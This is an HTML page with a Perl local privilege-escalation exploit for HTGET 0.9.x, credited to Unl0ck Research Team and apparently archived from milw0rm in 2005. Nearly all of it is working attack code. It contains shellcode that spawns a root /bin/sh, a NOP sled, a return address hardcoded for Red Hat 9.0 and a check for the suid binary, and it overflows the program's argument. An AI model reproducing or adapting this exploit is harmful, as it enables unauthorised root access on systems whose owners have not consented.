<html><head><title>HTGET <= 0.9.x Local Root Exploit</title></head><pre>#!/usr/bin/perl
#^^^^^^^^^^^^^^^^\....,,,,|:::::::____******
#HTGET &lt;= 0.9.x local lame r00t exploit	    *	
#written by nekd0 of Unl0ck Research Team    *
#(c) .unl0ck research team 2004-2005. 	     *
#	http://unl0ck.void.ru		    *	
#................/^^^^''''|:::::::----******

$shellcode = 
&quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80&quot;.
&quot;\xb0\x2e\xcd\x80\xeb\x15\x5b\x31&quot;.
&quot;\xc0\x88\x43\x07\x89\x5b\x08\x89&quot;.
&quot;\x43\x0c\x8d\x4b\x08\x31\xd2\xb0&quot;.
&quot;\x0b\xcd\x80\xe8\xe6\xff\xff\xff&quot;.
&quot;/bin/sh&quot;;

$len = 288;
$ret = 0xbfffd62a; #red hat 9.0 
$nop = &quot;\x90&quot;;
$offset = 0 ;
$vulnprog=&quot;/usr/bin/htget&quot;;

if (@ARGV == 1) {
    $offset = $ARGV[0];}

if (!-u($vulnprog)){print &quot;$vulnprog is not suid... exiting\n&quot;;exit();}

for ($i=0; $i&lt;($len-length($shellcode)-100);$i++)
	{$buffer .= $nop;}

$buffer .= $shellcode;

print (&quot;Address: 0x&quot;,sprintf('%lx',($ret+$offset)),&quot;\n&quot;);

$new_ret = pack('l',($ret + $offset));

for ($i+=length($shellcode); $i&lt;$len; $i+=4)
	{$buffer .=$new_ret}

exec(&quot;$vulnprog $buffer&quot;);

# milw0rm.com [2005-01-05]</pre></html>